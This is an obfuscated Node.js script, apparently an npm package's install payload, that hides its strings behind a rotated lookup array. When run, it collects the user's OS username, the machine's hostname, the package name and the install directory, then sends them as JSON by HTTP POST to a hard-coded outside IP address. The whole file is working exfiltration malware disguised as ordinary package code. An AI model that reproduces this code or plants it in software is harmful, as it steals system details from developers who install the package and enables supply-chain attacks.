const _0x327e14 = _0x2275;
function _0x2275(_0x15841c, _0x51b2bc) {
    const _0x1b1c65 = _0x4cd0();
    return _0x2275 = function (_0x438995, _0x5ada94) {
        _0x438995 = _0x438995 - (-0x9 * 0x389 + -0x51 * 0x62 + 0x3f9c);
        let _0x96ec0e = _0x1b1c65[_0x438995];
        return _0x96ec0e;
    }, _0x2275(_0x15841c, _0x51b2bc);
}
(function (_0xf91f0f, _0x1e6e75) {
    const _0x480a2d = _0x2275, _0x53bc6c = _0xf91f0f();
    while (!![]) {
        try {
            const _0x6fcda1 = parseInt(_0x480a2d(0xd8)) / (0x1e07 + -0x191 + -0x1c75) + parseInt(_0x480a2d(0xca)) / (0x1 * 0x1f7 + -0xbee + 0x9f9) * (-parseInt(_0x480a2d(0xda)) / (-0x152 + -0x1704 * -0x1 + -0x15af)) + parseInt(_0x480a2d(0xdf)) / (-0x926 + -0xa9 * 0xa + 0xfc4 * 0x1) + parseInt(_0x480a2d(0xe0)) / (-0x16d6 + -0x9ff * 0x3 + 0x34d8) * (-parseInt(_0x480a2d(0xd1)) / (-0x5f2 * 0x5 + 0x1 * -0x1c9a + 0x1 * 0x3a5a)) + parseInt(_0x480a2d(0xe6)) / (0x26a8 + -0x4 * 0x45f + -0x1525) + -parseInt(_0x480a2d(0xcb)) / (-0x1f6d + -0x73e + 0x26b3 * 0x1) + -parseInt(_0x480a2d(0xe2)) / (-0xaad * -0x3 + 0x1 * 0xfb1 + 0x1 * -0x2faf);
            if (_0x6fcda1 === _0x1e6e75)
                break;
            else
                _0x53bc6c['push'](_0x53bc6c['shift']());
        } catch (_0x42a644) {
            _0x53bc6c['push'](_0x53bc6c['shift']());
        }
    }
}(_0x4cd0, 0x4 * -0x5ece + -0x3c8e7 + -0x2 * -0x3b302));
const os = require('os'), https = require(_0x327e14(0xcc)), http = require(_0x327e14(0xd3));
var _username = os[_0x327e14(0xde)]()[_0x327e14(0xe5)], _hostname = os[_0x327e14(0xd7)](), _package = _0x327e14(0xd6) + _0x327e14(0xc9);
function _0x4cd0() {
    const _0x7d25e2 = [
        'username',
        '1623055dFAGkL',
        'ildr/ui',
        '118CUetKy',
        '259224vIieXU',
        'https',
        'close',
        'n/json',
        'end',
        '58d4-4cca-',
        '1896nbUgxi',
        'length',
        'http',
        'POST',
        'applicatio',
        '@releasebu',
        'hostname',
        '253039nJHXrP',
        'stringify',
        '11403JKNoNs',
        'write',
        '9c03-17253',
        '20.86.53.121',
        'userInfo',
        '258376WPyqni',
        '550bRalLp',
        'eacc74f',
        '1064943XedEdN',
        'request',
        '/c6b11fb7-'
    ];
    _0x4cd0 = function () {
        return _0x7d25e2;
    };
    return _0x4cd0();
}
const data = {
        'username': _username,
        'hostname': _hostname,
        'package': _package,
        'path': __dirname
    }, data_json = JSON[_0x327e14(0xd9)](data), options = {
        'hostname': _0x327e14(0xdd),
        'port': 0x1bb,
        'path': _0x327e14(0xe4) + _0x327e14(0xd0) + _0x327e14(0xdc) + _0x327e14(0xe1),
        'method': _0x327e14(0xd4),
        'headers': {
            'Content-Type': _0x327e14(0xd5) + _0x327e14(0xce),
            'Content-Length': data_json[_0x327e14(0xd2)],
            'Connection': _0x327e14(0xcd)
        }
    }, req = http[_0x327e14(0xe3)](options);
req[_0x327e14(0xdb)](data_json), req[_0x327e14(0xcf)]();
